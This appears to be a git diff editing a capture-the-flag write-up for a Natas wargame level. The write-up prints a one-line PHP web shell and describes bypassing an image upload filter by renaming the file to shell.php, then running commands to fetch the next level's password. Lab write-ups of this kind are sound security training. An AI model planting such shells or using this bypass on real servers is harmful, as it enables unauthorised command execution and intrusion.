@@ -1,5 +1,5 @@
 # Level 12
-This level was fun to solve.
+This level was fun to solve, we get to upload a simple webshell.
 
 ## Quest
 We are presented with below page, with option to upload an image.
@@ -61,27 +61,30 @@ Choose a JPEG to upload (max 1KB):<br/>
 <br/><br/>
 
 ## Solution
-The first 3 functions basically concern with generating a random name of the file uploaded. First i'll try to upload a simple PHP shell and see what happens.<br/>
+First i'll try to upload a simple PHP shell and see what happens.<br/>
 Our simple PHP shell
 ```php
 <?php echo '<pre>' . shell_exec($_GET["cmd"]) . '</pre>' ?>
 ```
-Above shell, executes command present in `cmd` query parameter.
+Above shell, executes command present in `cmd` query parameter in the URL.<br/>
 We will see this with Burp
 
 ![Level 12 Solution](./images/Level12_solution.png)
 
-Now, if we go to the URL where our image is uploaded, it doesn't execute our shell as it treats is like a `.jpg` file.
+Now, if we go to the URL where our image is uploaded, it *doesn't* execute our shell as it treats is like a `.jpg` file.
 <br/><br/>
-We again try to upload our shell but this time, we intercept the reqeust via burp and change the `filename` parameter to `shell.php`. See below
+
+We again try to upload our shell but this time, we intercept the reqeust via burp and change the `filename` parameter to `shell.php`. Due to which our file gets uploaded with `.php` extension.
 ![Level 12.1 Solution](./images/Level12.1_solution.png)
-Now our file is uploaded with `.php` extension
+
 <br/><br/>
-We Test our shell by adding the query parameter `cmd=ifconfig`. We see that if runs
+We Test our shell by adding the query parameter `cmd=ifconfig`. We see that command gets executed and we recieve the output. Sweet!
 ![Level 12.2 Solution](./images/Level12.2_solution.png)
+<br/>
 
 Finally, we try to get the password for next Level
 ![Level 12.3 Solution](./images/Level12.3_solution.png)
+<span id=green>Sucess!</span>
 <br/>
 
 [<< Back](https://grey-fish.github.io/Natas/index.html)
